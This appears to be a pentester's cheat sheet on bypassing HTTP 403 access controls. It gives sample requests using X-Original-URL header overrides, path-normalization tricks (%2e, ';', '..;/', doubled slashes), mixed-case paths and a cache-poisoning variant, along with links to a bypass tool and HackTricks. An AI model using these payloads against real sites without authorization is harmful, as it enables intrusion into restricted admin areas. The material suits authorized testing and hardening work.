---
title: "Bypass 403 (Forbidden)"
author: ["4shen0ne"]
draft: false
---

## Using "X-Original-URL" header {#using-x-original-url-header}

```nil
GET /admin HTTP/1.1
Host: target.com
```

Try this to bypass

```nil
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```


## Appending **%2e** after the first slash {#appending-2e-after-the-first-slash}

```nil
http://target.com/admin => 403
```

Try this to bypass

```nil
http://target.com/%2e/admin => 200
```


## Try add dot (.) slash (/) and semicolon (;) in the URL {#try-add-dot--dot--slash-----and-semicolon-----in-the-url}

```nil
http://target.com/admin => 403
```

Try this to bypass

```nil
http://target.com/secret/. => 200
http://target.com//secret// => 200
http://target.com/./secret/.. => 200
http://target.com/;/secret => 200
http://target.com/.;/secret => 200
http://target.com//;//secret => 200
```


## Add "..;/" after the directory name {#add-dot-dot-after-the-directory-name}

```nil
http://target.com/admin
```

Try this to bypass

```nil
http://target.com/admin..;/
```


## Try to uppercase the alphabet in the url {#try-to-uppercase-the-alphabet-in-the-url}

```nil
http://target.com/admin
```

Try this to bypass

```nil
http://target.com/aDmIN
```


## Via Web Cache Poisoning {#via-web-cache-poisoning}

```nil
GET /anything HTTP/1.1
Host: victim.com
X­-Original-­URL: /admin
```


## Tools {#tools}

-   [Bypass-403 | Go script for
    bypassing 403 forbidden](https://github.com/daffainfo/bypass-403)


## References {#references}

-   [[cite/t:@iam_j0ker](https://twitter.com/iam_j0ker)]
-   [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web)
